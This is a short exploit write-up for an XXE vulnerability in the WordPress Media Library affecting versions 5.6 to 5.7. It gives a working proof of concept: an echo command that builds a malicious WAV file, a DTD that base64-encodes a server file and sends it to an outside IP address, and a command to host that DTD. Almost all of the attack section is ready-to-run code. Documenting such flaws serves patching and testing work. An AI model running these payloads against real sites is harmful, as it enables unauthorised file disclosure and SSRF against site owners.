# WordPress XXE Vulnerability in Media Library

## Description

WordPress versions 5.7, 5.6.2, 5.6.1, 5.6, 5.0.11 are affected to XML eXternal Entity vulnerability where an authenticated user with the ability to upload files in the Media Library can upload a malicious WAVE file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF). You can upload media file on WordPress Media Library in order to use it inside a post. Once a WAVE file is uploaded, the wp_read_audio_metadata() WordPress function extracts audio information from the iXML metadata included in $thisfile_riff_WAVE['iXML'][0]['data'] variable that can contains malicious XML eXternal Entity.

## Proof of concept

Creating a malicious .WAV payload
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://192.168.1.7:9123/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Create the evil.dtd payload
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/opt">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.18/?p=%file;'>">
```

Host the evil.dtd on HTTP service, upload the file and wait for the payload to execute
```
php -S 0.0.0.0:80
```

#### References
https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
